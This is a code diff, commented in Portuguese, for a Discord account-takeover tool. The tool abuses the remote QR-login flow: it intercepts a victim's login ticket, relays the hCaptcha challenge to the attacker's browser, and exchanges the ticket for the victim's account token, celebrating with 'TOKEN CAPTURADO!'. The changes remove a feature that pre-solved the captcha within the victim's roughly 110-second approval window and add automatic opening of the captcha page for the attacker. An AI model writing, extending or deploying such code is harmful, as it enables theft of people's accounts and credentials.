@@ -203,8 +203,6 @@ class RemoteAuthSession(threading.Thread):
                         "session": self,
                     }
                     self.state = "captcha"
-                    # link preferencial via HTTPS do tunel (contexto igual
-                    # ao do Discord -> token do hCaptcha valido)
                     turl = ""
                     try:
                         turl = open("tunnel_url.txt").read().strip()
@@ -213,6 +211,15 @@ class RemoteAuthSession(threading.Thread):
                     base = turl or f"http://{lan_ip()}:8080"
                     print(f"[captcha] resolva em {base}/captcha/{sid} "
                           f"(ou http://localhost:8080/captcha/{sid})", flush=True)
+                    # abre a pagina automaticamente no navegador do atacante
+                    # (o rqdata tem TTL curto p/ renderizar)
+                    try:
+                        if os.name == "nt":
+                            os.startfile(f"http://localhost:8080/captcha/{sid}")
+                            print("[captcha] pagina aberta automaticamente",
+                                  flush=True)
+                    except Exception as e:
+                        print("auto-open falhou:", repr(e)[:100], flush=True)
                     return r
                 time.sleep(2)
             except Exception as e:
@@ -265,23 +272,10 @@ class RemoteAuthSession(threading.Thread):
         elif op == "pending_login":
             ticket = m["ticket"]
             self.state = "captcha"   # enquanto tenta a troca
-            # usa captcha pre-armado se estiver fresco (<110s)
-            armed_key = armed_ekey = None
-            with ARM_LOCK:
-                if ARMED["key"] and time.time() - ARMED["ts"] < 110:
-                    armed_key = ARMED["key"]
-                    armed_ekey = ARMED["ekey"]
-                    ARMED["key"] = None   # consome
-            if armed_key:
-                print("[sessao] captcha pre-armado — trocando direto",
-                      flush=True)
-                threading.Thread(target=self.try_exchange,
-                                 args=(ticket, armed_key, armed_ekey, 1),
-                                 daemon=True).start()
-            else:
-                print("[sessao] ticket recebido, trocando...", flush=True)
-                threading.Thread(target=self.try_exchange,
-                                 args=(ticket,), daemon=True).start()
+            print("[sessao] ticket recebido, trocando...", flush=True)
+            # em thread separada p/ nao travar o ws (heartbeat continua)
+            threading.Thread(target=self.try_exchange,
+                             args=(ticket,), daemon=True).start()
 
         elif op == "cancel":
             self.state = "cancelled"
@@ -677,25 +671,16 @@ class Handler(BaseHTTPRequestHandler):
                 f"<li><a href='/captcha/{s}'>/captcha/{s}</a></li>"
                 for s in CAPTCHAS)
             self._html(
-                "<h2>Captchas pendentes</h2><ul>" + items + "</ul>" +
-                "<p><a href='/arm'>⚡ Pre-armar captcha</a> "
-                "(resolva ANTES da vitima aprovar — janela de ~110s)</p>"
-                if items else
-                "<h2>Nenhum captcha pendente</h2>"
-                "<p><a href='/arm'>⚡ Pre-armar captcha</a> "
-                "(resolva ANTES da vitima aprovar — janela de ~110s)</p>")
-        elif u.path == "/arm":
-            sitekey, rqdata = arm_probe()
-            self._html(captcha_page("ARM", sitekey, rqdata, arm=True))
+                "<h2>Captchas pendentes</h2><ul>" + items + "</ul>"
+                if items else "<h2>Nenhum captcha pendente</h2>")
         elif u.path.startswith("/captcha/"):
             sid = u.path.split("/")[-1]
             c = CAPTCHAS.get(sid)
             if not c:
                 self._html("sessao de captcha nao encontrada", 404)
             else:
-                # rqdata FRESCO na hora que a pagina abre (o antigo expira)
-                sitekey, rqdata = arm_probe()
-                self._html(captcha_page(sid, sitekey, rqdata))
+                # rqdata do MESMO 400 do ticket (binding correto)
+                self._html(captcha_page(sid, c["sitekey"], c["rqdata"]))
         else:
             self._html("not found", 404)
 
@@ -737,27 +722,15 @@ class Handler(BaseHTTPRequestHandler):
                 self._json({"ok": False, "erro": "sessao/chave invalida"})
                 return
             CAPTCHAS.pop(sid, None)
-            # sincrono: a pagina espera e mostra o resultado REAL
-            r = c["session"].try_exchange(c["ticket"], key, ekey, 1)
+            # rqtoken = ekey (se houver) senao o proprio rqdata do pedido
+            rqtoken = ekey or c.get("rqdata", "")
+            r = c["session"].try_exchange(c["ticket"], key, rqtoken, 1)
             if r is not None and r.status_code == 200:
                 self._json({"ok": True, "msg": "TOKEN CAPTURADO! 🎉"})
             else:
                 self._json({"ok": False,
                             "status": getattr(r, "status_code", None),
                             "msg": "troca falhou — veja o console"})
-        elif u.path == "/api/arm":
-            key = data.get("key")
-            ekey = data.get("ekey", "")
-            if not key:
-                self._json({"ok": False, "erro": "sem chave"})
-                return
-            with ARM_LOCK:
-                ARMED["key"] = key
-                ARMED["ekey"] = ekey
-                ARMED["ts"] = time.time()
-            print("[arm] captcha pre-armado! valido por ~110s", flush=True)
-            self._json({"ok": True,
-                        "armado": "armado! faca a vitima aprovar em ate 110s"})
         else:
             self._json({"error": "not found"}, 404)
 
